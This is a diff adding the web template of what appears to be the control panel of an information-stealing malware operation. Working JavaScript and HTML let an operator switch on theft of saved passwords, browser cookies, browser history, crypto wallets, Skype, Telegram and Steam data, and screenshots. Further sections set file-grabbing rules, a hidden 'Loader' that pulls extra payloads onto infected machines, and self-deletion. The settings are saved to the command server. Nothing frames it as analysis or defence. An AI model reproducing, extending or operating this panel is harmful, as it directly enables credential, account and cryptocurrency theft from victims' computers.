@@ -1,0 +1,426 @@
+<script>
+		
+
+        function deleteRow(r, tableid) {
+            var i = r.parentNode.parentNode.rowIndex;
+            document.getElementById(tableid).deleteRow(i);
+        }
+/*		
+		document.getElementById("cfgTable").deleteRow(this.parentNode.parentNode.rowIndex);
+*/
+		function replaceSlashes(key, value) 
+{
+  if ( typeof value == "string")
+  {
+    value = value.replace(/\//g, "\\/");
+  }
+  return value;
+}
+
+
+        function AddToTableLoader(tableid, ldLink, ldTags, ldHide) {
+				if (ldLink.indexOf("'") !== -1)  return;
+				if (ldLink.indexOf('"') !== -1)  return;
+				if (ldLink.indexOf('<') !== -1) return;
+				
+				if (ldTags.indexOf("'") !== -1) return;
+				if (ldTags.indexOf('"') !== -1) return;
+				if (ldTags.indexOf('<') !== -1) return;
+				
+			
+			checkedStr1 = '';
+            if (ldHide === true) checkedStr1 = 'checked';
+			
+
+			
+            var html = '<button onClick = "deleteRow(this, '+String.fromCharCode(39)+tableid+String.fromCharCode(39)+')">   [X] Delete</button>'+
+				'<table class="dates-table"><tr><td>Link: </td>' +
+                '<td><input class="edit" type="text" name="ldLink" size="40" value = "' + ldLink + '"></td></tr>' +
+
+
+
+
+                '<tr><td>Hide mode:</b>' +
+                '<td><input type="checkbox" name="ldHide" ' + checkedStr1 + '></td></tr>' +
+				
+
+                '<tr><td>Tags:</b><br>' +
+                '<td><textarea class="edit" rows="3" cols="45" name="ldTags">' + ldTags + '</textarea></td></tr></table>' +
+
+                '<br>';
+
+
+            var table = document.getElementById(tableid);
+            var rowscount = table.getElementsByTagName("tr").length;
+            var row = table.insertRow(0);
+            var cell1 = row.insertCell(0);
+            var cell2 = row.insertCell(1);
+            cell1.innerHTML = "";
+
+            cell2.innerHTML = html;
+            //alert(cell2.innerHTML);
+        }
+		
+		
+		
+		function AddToTable(tableid, fgName, fgPath, fgMask, fgMaxsize, fgSubfolders, fgShortcuts, fgExceptions) {
+				if (fgName.indexOf("'") !== -1)  return;
+				if (fgName.indexOf('"') !== -1)  return;
+				if (fgName.indexOf('<') !== -1) return;
+				
+				if (fgPath.indexOf("'") !== -1) return;
+				if (fgPath.indexOf('"') !== -1) return;
+				if (fgPath.indexOf('<') !== -1) return;
+				
+				if (fgMask.indexOf("'") !== -1) return;
+				if (fgMask.indexOf('"') !== -1) return;
+				if (fgMask.indexOf('<') !== -1) return;
+				
+				if (fgMaxsize.indexOf("'") !== -1) return;
+				if (fgMaxsize.indexOf('"') !== -1) return;
+				if (fgMaxsize.indexOf('<') !== -1) return;
+				
+				if (fgExceptions.indexOf("'") !== -1) return;
+				if (fgExceptions.indexOf('"') !== -1) return;
+				if (fgExceptions.indexOf('<') !== -1) return;
+			
+			checkedStr1 = '';
+            if (fgSubfolders === true) checkedStr1 = 'checked';
+			
+            checkedStr2 = '';
+            if (fgShortcuts === true) checkedStr2 = 'checked';
+			
+            var html = '<button onClick = "deleteRow(this, '+String.fromCharCode(39)+tableid+String.fromCharCode(39)+')">   [X] Delete</button>'+
+				'<table class="dates-table"><tr><td>Name: </td>' +
+                '<td><input class="edit" type="text" name="fgName" size="40" value = "' + fgName + '"></td></tr>' +
+
+                '<tr><td>Path:</td>' +
+                '<td><input class="edit" type="text" name="fgPath" size="40" value = "' + fgPath + '"></td>' +
+
+                '<tr><td>Mask:</b>' +
+                '<td><input class="edit" type="text" name="fgMask" size="40" value = "' + fgMask + '"></td></tr>' +
+
+                '<tr><td>Max size:</b>' +
+                '<td><input class="edit" type="number" name="fgMaxsize" size="40" value = "' + fgMaxsize + '"></td></tr>' +
+
+
+
+                '<tr><td>Subfolders processing:</b>' +
+                '<td><input type="checkbox" name="fgSubfolders" ' + checkedStr1 + '></td></tr>' +
+				
+				'<tr><td>Shortcuts processing:</b>' +
+                '<td><input type="checkbox" name="fgShortcuts" ' + checkedStr2 + '></td></tr>' +
+
+                '<tr><td>Exceptions:</b><br>' +
+                '<td><textarea class="edit" rows="3" cols="45" name="fgExceptions">' + fgExceptions + '</textarea></td></tr></table>' +
+
+                '<br>';
+
+
+            var table = document.getElementById(tableid);
+            var rowscount = table.getElementsByTagName("tr").length;
+            var row = table.insertRow(0);
+            var cell1 = row.insertCell(0);
+            var cell2 = row.insertCell(1);
+            cell1.innerHTML = "";
+
+            cell2.innerHTML = html;
+            //alert(cell2.innerHTML);
+        }
+
+
+
+        function ConfigToJson() {
+
+            var obj = new Object();
+            obj.isDouble = document.getElementsByName("isDouble")[0].checked;
+            obj.isSavedPasswords = document.getElementsByName("isSavedPasswords")[0].checked;
+            obj.isBrowserData = document.getElementsByName("isBrowserData")[0].checked;
+			obj.isBrowserHistory = document.getElementsByName("isBrowserHistory")[0].checked;
+            obj.isWallets = document.getElementsByName("isWallets")[0].checked;
+            obj.isSkype = document.getElementsByName("isSkype")[0].checked;
+            obj.isTelegram = document.getElementsByName("isTelegram")[0].checked;
+            obj.isSteam = document.getElementsByName("isSteam")[0].checked;
+			obj.isScreenshot = document.getElementsByName("isScreenshot")[0].checked;
+			obj.isDelete = document.getElementsByName("isDelete")[0].checked;
+
+            obj.files = new Object();
+
+
+            var fgNames = document.getElementsByName("fgName");
+            var fgPaths = document.getElementsByName("fgPath");
+            var fgMasks = document.getElementsByName("fgMask");
+            var fgMaxsizes = document.getElementsByName("fgMaxsize");
+            var fgSubfolderss = document.getElementsByName("fgSubfolders");
+			var fgShortcutss = document.getElementsByName("fgShortcuts");
+            var fgExceptionss = document.getElementsByName("fgExceptions");
+            for (var i = 0; i < fgNames.length; i++) {
+				
+				if (fgNames[i].value.indexOf("'") !== -1) continue;
+				if (fgNames[i].value.indexOf('"') !== -1) continue;
+				if (fgNames[i].value.indexOf('<') !== -1) continue;
+				
+				if (fgPaths[i].value.indexOf("'") !== -1) continue;
+				if (fgPaths[i].value.indexOf('"') !== -1) continue;
+				if (fgPaths[i].value.indexOf('<') !== -1) continue;
+				
+				if (fgMasks[i].value.indexOf("'") !== -1) continue;
+				if (fgMasks[i].value.indexOf('"') !== -1) continue;
+				if (fgMasks[i].value.indexOf('<') !== -1) continue;
+				
+				if (fgMaxsizes[i].value.indexOf("'") !== -1) continue;
+				if (fgMaxsizes[i].value.indexOf('"') !== -1) continue;
+				if (fgMaxsizes[i].value.indexOf('<') !== -1) continue;
+				
+				if (fgExceptionss[i].value.indexOf("'") !== -1) continue;
+				if (fgExceptionss[i].value.indexOf('"') !== -1) continue;
+				if (fgExceptionss[i].value.indexOf('<') !== -1) continue;
+				
+				
+                obj.files[i] = new Object();
+                obj.files[i].fgName = Base64.encode(fgNames[i].value);
+                obj.files[i].fgPath = Base64.encode(fgPaths[i].value);
+                obj.files[i].fgMask = Base64.encode(fgMasks[i].value);
+                obj.files[i].fgMaxsize = Base64.encode(fgMaxsizes[i].value);
+                obj.files[i].fgSubfolders = (fgSubfolderss[i].checked);
+				obj.files[i].fgShortcuts = (fgShortcutss[i].checked);
+                obj.files[i].fgExceptions = Base64.encode(fgExceptionss[i].value);
+				
+
+            }
+
+			
+            obj.loader = new Object();
+
+
+            var ldLink = document.getElementsByName("ldLink");
+            var ldHide = document.getElementsByName("ldHide");
+            var ldTags = document.getElementsByName("ldTags");
+			
+            for (var i = 0; i < ldLink.length; i++) {
+				
+				if (ldLink[i].value.indexOf("'") !== -1) continue;
+				if (ldLink[i].value.indexOf('"') !== -1) continue;
+				if (ldLink[i].value.indexOf('<') !== -1) continue;
+				
+				if (ldTags[i].value.indexOf("'") !== -1) continue;
+				if (ldTags[i].value.indexOf('"') !== -1) continue;
+				if (ldTags[i].value.indexOf('<') !== -1) continue;
+			
+				
+                obj.loader[i] = new Object();
+                obj.loader[i].ldLink = Base64.encode(ldLink[i].value);               
+                obj.loader[i].ldHide = (ldHide[i].checked);
+                obj.loader[i].ldTags = Base64.encode(ldTags[i].value);
+				
+
+            }
+			
+			
+            var jsonString = JSON.stringify(obj);
+			
+			sendPost('action=SetConfig&cfg='+encodeURIComponent(jsonString));
+
+        }
+
+
+
+        function JsonToConfig(JSONstr) {
+            obj = JSON.parse(JSONstr);
+            document.getElementsByName("isDouble")[0].checked = obj.isDouble;
+            document.getElementsByName("isSavedPasswords")[0].checked = obj.isSavedPasswords;
+            document.getElementsByName("isBrowserData")[0].checked = obj.isBrowserData;
+			document.getElementsByName("isBrowserHistory")[0].checked = obj.isBrowserHistory;
+            document.getElementsByName("isWallets")[0].checked = obj.isWallets;
+            document.getElementsByName("isSkype")[0].checked = obj.isSkype;
+            document.getElementsByName("isTelegram")[0].checked = obj.isTelegram;
+            document.getElementsByName("isSteam")[0].checked = obj.isSteam;
+			document.getElementsByName("isScreenshot")[0].checked = obj.isScreenshot;
+			document.getElementsByName("isDelete")[0].checked = obj.isDelete;
+            
+            Object.keys(obj.files).forEach(function(item, i, arr) {
+
+				
+                AddToTable(
+					'file_rules',
+					Base64.decode(obj.files[i].fgName),
+                    Base64.decode(obj.files[i].fgPath),
+                    Base64.decode(obj.files[i].fgMask),
+                    Base64.decode(obj.files[i].fgMaxsize),
+					(obj.files[i].fgSubfolders),
+                    (obj.files[i].fgShortcuts),
+                    Base64.decode(obj.files[i].fgExceptions)
+					);
+            });
+			
+			
+			Object.keys(obj.loader).forEach(function(item, i, arr) {
+
+				
+                AddToTableLoader(
+					'loader_rules',
+					Base64.decode(obj.loader[i].ldLink),
+                    Base64.decode(obj.loader[i].ldTags),
+                    obj.loader[i].ldHide
+                    
+					);
+            });
+			
+			
+			
+			
+			
+
+        }
+    </script>
+
+
+<div class="info-text1">
+				<center>Main Page</center>
+</div>
+
+
+<div class="info-text1">
+<div style="display: inline-block;">
+<img src = "img/st.png"> Stats<br>
+%STATS%
+
+</div>
+</div>
+
+
+<div class="info-text1">
+
+
+
+            <img src = "img/cfg.png"> Config<br>
+
+                <table class="config-table" id="cfgTable">
+                  
+                    <tr>
+                        <td>Repeated reports:</td>
+                        <td>
+						
+
+								<input type="checkbox"   name="isDouble" value="1"></td>
+
+						
+						
+						
+						
+						
+						
+						
+                    </tr>
+                    <tr>
+                        <td>Saved passwords:</td>
+                        <td><input type="checkbox" name="isSavedPasswords" id="checkboxThree" value="1"></td>
+                    </tr>
+                    <tr>
+                        <td>Browsers cookies and autocomplete:</td>
+                        <td><input type="checkbox" name="isBrowserData" value="1"></td>
+                    </tr>
+					
+					<tr>
+                        <td>Browsers history:</td>
+                        <td><input type="checkbox" name="isBrowserHistory" value="1"></td>
+                    </tr>
+					
+					
+                    <tr>
+                        <td>Cryptocurrency clients files:</td>
+                        <td><input type="checkbox" name="isWallets" value="1"></td>
+                    </tr>
+                    <tr>
+                        <td>Skype History:</td>
+                        <td><input type="checkbox" name="isSkype" value="1"></td>
+                    </tr>
+                    <tr>
+                        <td>Telegram:</td>
+                        <td><input type="checkbox" name="isTelegram" value="1"></td>
+                    </tr>
+                    <tr>
+                        <td>Steam files:</td>
+                        <td><input type="checkbox" name="isSteam" value="1"></td>
+                    </tr>
+					
+					<tr>
+                        <td>Screenshot:</td>
+                        <td><input type="checkbox" name="isScreenshot" value="1"></td>
+                    </tr>
+					
+                    <tr>
+                        <td>Files grabber:</td>
+                        <td><button onclick="AddToTable('file_rules','','','','10',false,false,'')">[+] Add rule</button><br>
+						<table id="file_rules" class="config-table">
+							
+						</table>
+						</td>
+						
+                    </tr>
+
+                    <tr>
+                        <td>Loader:<br>
+                        </td>
+                        <td><button onclick="AddToTableLoader('loader_rules','','',false)">[+] Add rule</button><br>
+						<table id="loader_rules" class="config-table">
+							
+						</table></td>
+                    </tr>
+					
+					<tr>
+                        <td>Self-deletion:</td>
+                        <td><input type="checkbox" name="isDelete" value="1"></td>
+                    </tr>
+
+
+                </table>
+
+                <br>
+                <button onClick="ConfigToJson()">Save</button>
+                
+				
+				<script>
+				window.onload = function() {
+				JsonToConfig(Base64.decode('%JSONstr%'))
+				//alert(Base64.encode('123'));
+			};
+			</script>
+		</div>
+		
+
+<div class="info-text1">
+		
+		<img src = "img/tool.png"> Control<br>
+		<a href="?page=serverinfo"><button>Server info</button></a><br><br>
+		
+	
+
+
+			
+	
+		<form method="POST">
+			<input type="hidden" name="action" value="EmptyTrash">	
+			<input type="hidden" name="csrf_token" value="%csrf_token%">	
+			<input type="submit" value="EmptyTrash" class="sbutton" onclick="return confirm('Are you sure?')">
+		</form>
+		
+		<form method="POST">
+			<input type="hidden" name="action" value="Empty0000">	
+			<input type="hidden" name="csrf_token" value="%csrf_token%">	
+			<input type="submit" value="Delete 0|0|0|0" class="sbutton" onclick="return confirm('Are you sure?')">
+		</form>
+		
+		<form method="POST">
+			<input type="hidden" name="action" value="DeleteAll">
+			<input type="hidden" name="csrf_token" value="%csrf_token%">				
+			<input type="submit" value="DeleteAll" class="sbutton" onclick="return confirm('Are you sure?')">
+		</form>
+		
+		
+		
+		
+</div>	
+
+	
+			
